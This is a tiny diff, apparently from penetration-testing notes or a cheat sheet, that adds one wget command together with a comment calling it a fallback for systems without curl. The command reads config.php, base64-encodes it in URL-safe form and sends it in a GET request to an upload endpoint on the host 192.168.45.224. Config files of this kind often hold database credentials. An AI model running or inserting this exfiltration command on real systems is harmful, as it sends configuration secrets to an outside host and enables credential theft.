@@ -1,0 +1,3 @@
+# for missing `curl` and base64 urlsafe for `GET` mode of file uploads
+wget "http://192.168.45.224/ul?config.php=$(cat config.php | base64 -w0 | tr '/+' '_-')"
+
